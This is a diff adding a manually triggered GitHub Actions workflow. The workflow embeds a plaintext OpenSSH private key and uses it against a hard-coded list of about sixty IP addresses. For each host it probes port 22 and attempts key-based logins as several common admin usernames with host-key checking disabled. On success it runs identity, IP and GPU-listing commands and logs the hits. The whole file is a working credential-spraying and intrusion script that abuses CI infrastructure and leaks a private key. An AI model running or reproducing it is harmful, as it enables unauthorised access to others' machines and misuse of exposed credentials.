@@ -1,0 +1,39 @@
+name: ul6599-keydrive
+on:
+  workflow_dispatch:
+jobs:
+  keys:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: drive
+        run: |
+          set +e
+          umask 077; mkdir -p $HOME/.ssh
+          cat > $HOME/.ssh/azadmin <<'KEOF'
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
+c2gtZWQyNTUxOQAAACB1Pynx4u/dGFT2qTkyPEvyIkAvlHpMczBRl15lacJbRQAA
+AIg0qx+uNKsfrgAAAAtzc2gtZWQyNTUxOQAAACB1Pynx4u/dGFT2qTkyPEvyIkAv
+lHpMczBRl15lacJbRQAAAECrZH9nkDm8rbuH47FtzlCQfwMADdDVNxYvGqSgTwtc
+DHU/KfHi790YVPapOTI8S/IiQC+UekxzMFGXXmVpwltFAAAAAAECAwQF
+-----END OPENSSH PRIVATE KEY-----
+KEOF
+          chmod 600 $HOME/.ssh/azadmin
+          echo "=== FINGERPRINT ==="; ssh-keygen -lf $HOME/.ssh/azadmin
+          echo "=== PUB ==="; ssh-keygen -y -f $HOME/.ssh/azadmin | head -c 120; echo
+          OPTS="-i $HOME/.ssh/azadmin -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=6 -o PasswordAuthentication=no -o PubkeyAcceptedAlgorithms=+ssh-ed25519"
+          for H in 20.74.153.201 20.50.113.151 20.237.207.128 20.205.187.223 4.194.2.30 70.153.87.133 4.246.80.6 51.104.16.184 40.123.206.138 134.149.42.155 134.149.59.33 135.116.19.243 135.116.84.27 135.225.79.249 168.62.216.152 172.174.31.97 172.213.25.163 20.109.152.114 20.109.162.87 20.114.255.207 20.115.147.1 20.118.131.83 20.125.42.21 20.125.49.91 20.125.99.42 20.216.40.163 20.223.198.42 20.225.239.178 20.234.97.205 20.240.130.208 20.240.141.10 20.240.55.118 20.245.108.11 20.59.127.108 20.74.241.13 20.74.242.85 20.91.207.55 20.97.252.251 23.100.38.120 4.155.130.93 4.193.185.193 4.204.241.108 4.210.119.224 40.113.1.63 40.70.241.0 40.70.247.98 48.193.46.184 48.193.47.3 52.236.59.223 57.154.50.93 57.174.238.72 70.153.141.118 70.153.142.83 70.153.148.119 70.153.149.34 70.153.18.193 74.162.158.9 74.234.69.82 98.71.78.150; do
+            OPEN=$(timeout 4 bash -c "echo > /dev/tcp/$H/22" 2>/dev/null && echo yes || echo no)
+            [ "$OPEN" = "no" ] && { echo "PORT22_CLOSED $H"; continue; }
+            for U in azureuser ubuntu root uladmin admin ul; do
+              OUT=$(timeout 12 ssh $OPTS -l $U $H 'id; hostname -I; nvidia-smi -L 2>/dev/null | head -2' 2>&1 | tr '\n' '|')
+              case "$OUT" in
+                *uid=*) echo "KEY_HIT $H $U :: $OUT" ;;
+                *"Permission denied"*) echo "KEY_NO $H $U" ;;
+                *"No such file"*|*"not found"*) echo "KEY_NO $H $U" ;;
+                *) echo "KEY_OTHER $H $U :: $(echo "$OUT" | head -c 120)" ;;
+              esac
+            done
+          done
+          echo "=== DONE ==="
